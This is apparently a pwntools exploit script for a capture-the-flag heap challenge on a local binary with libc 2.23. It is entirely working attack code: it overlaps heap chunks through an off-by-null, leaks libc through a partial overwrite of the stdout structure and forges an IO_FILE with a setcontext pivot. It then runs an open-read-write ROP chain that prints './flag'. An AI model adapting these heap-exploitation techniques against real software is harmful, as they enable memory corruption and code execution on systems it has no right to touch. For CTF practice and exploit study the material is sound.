from pwn import*
import os
context.arch = 'AMD64'
def menu(ch):
	p.sendlineafter('>>',str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('length?',str(size))
	p.sendafter('for us:',content)
def free(index):
	menu(2)
	p.sendlineafter('revoke?',str(index))
def edit(index,content):
	menu(3)
	p.sendlineafter('edit?',str(index))
	p.sendafter('content:',content)
def F(index):
	p.sendline('2')
	p.sendline(str(index))
def N(size,content):
	p.sendline('1')
	p.sendline(str(size))
	p.send(content)
def E(index,content):
	p.sendline('3')
	p.sendline(str(index))
	p.send(content)
def gift():
	menu(666)
p = process('./main')
libc = ELF('./libc-2.23.so')
new(0x10,'FMYY')
new(0x10,'FMYY')
new(0xF0,'FMYY')
new(0xF0,'FMYY')
new(0xF0,'FMYY')
new(0xF0,'FMYY')
free(2)
free(0)
new(0xF8,'\x00'*0xF0 + p64(0x140)) #0
free(3)
new(0x10,'FMYY') #2
new(0x10,'FMYY') #3 3 = 1
new(0xF0,'FMYY') #6 6 = 0
new(0xF0,'FMYY') #7
#############
free(2)
free(0)
new(0xF8,'\x00'*0xF0 + p64(0x140)) #0
free(7)
new(0x10,'FMYY') #2
new(0x10,'FMYY') #7 = 3 = 1
new(0xF0,'FMYY') #8 = 6 = 0
new(0xF0,'FMYY') #9

###############
free(9)
free(2)
new(0xF8,'\x00'*0xF0 + p64(0x240)) #2
free(4)
new(0x10,'FMYY') #4
new(0x10,'FMYY') #9 = 7 = 3 = 1
new(0x19,'FMYY') #10 = 8 = 6 = 0
new(0xF0,'FMYY') #11 = 2
new(0xF0,'FMYY') #12
###############
for i in range(0x13):
	new(0xF0,(p64(0) + p64(0x11)) * ( 0xF0 / 0x10))
free(0)
edit(6,'\x00'*8 + '\xE8\x37')
new(0xF0,'\x00'*0x10 + p64(0x11))
free(1)
free(4)
free(3)
free(0x18) # no....
new(0x10,'\x38')
new(0x10,'FMYY')
new(0x11,'\x00'*0x10 + '\x21')
new(4,p32(0x1631))
free(6)
E(0x18,p32(0x1651))
F(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdout_'] - 131
log.info('LIBC:\t' + hex(libc_base))
binsh = libc_base + libc.search('/bin/sh').next()
system = libc_base + libc.sym['system']
IO_str_jumps = libc_base + 0x3C37A0
frame_address = libc_base + libc.sym['__malloc_hook'] + 0x10
pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rdx_ret = libc_base + 0x0000000000001B92
ret = libc_base + 0x0000000000000937
syscall = libc_base + 0xF8A95
Write = libc_base + libc.sym['write']
Read = libc_base + libc.sym['read']
Open = libc_base + libc.sym['open']
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = frame_address
frame.rdx = 0x100
frame.rsp = frame_address
frame.rip = syscall

edit(0x18,p32(0x1410))
fake_IO_FILE  = p64(0)*2
fake_IO_FILE += p64(0) + p64(0x100)
fake_IO_FILE += p64(0) + p64(frame_address)
fake_IO_FILE = fake_IO_FILE.ljust(0xC8,'\x00')
fake_IO_FILE += p64(IO_str_jumps -8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['setcontext'] + 53)
edit(8,fake_IO_FILE)
free(10)
free(1)
free(3)
free(4)
new(0x10,p64(0x101))
new(0x10,'FMYY')
new(0x10,'FMYY')
free(2)
free(0x19)
free(11)
new(0xF0,p64(libc_base + libc.sym['__malloc_hook'] + 0x10))
new(0xF0,'FMYY')
new(0xF0,'FMYY')
new(0xF0,str(frame)[0x10:0x100])
free(0)
free(3)
free_hook = libc_base + libc.sym['__free_hook']
orw  = p64(pop_rdi_ret) + p64(frame_address + 0x98)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(4)
orw += p64(pop_rsi_ret) + p64(free_hook)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Read)
orw += p64(pop_rdi_ret) + p64(1)
orw += p64(pop_rsi_ret) + p64(free_hook)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(Write)
orw  = orw.ljust(0x90,'\x00')
orw += './flag\x00\x00'
p.sendline(orw)
os.system('rm core')
p.interactive()
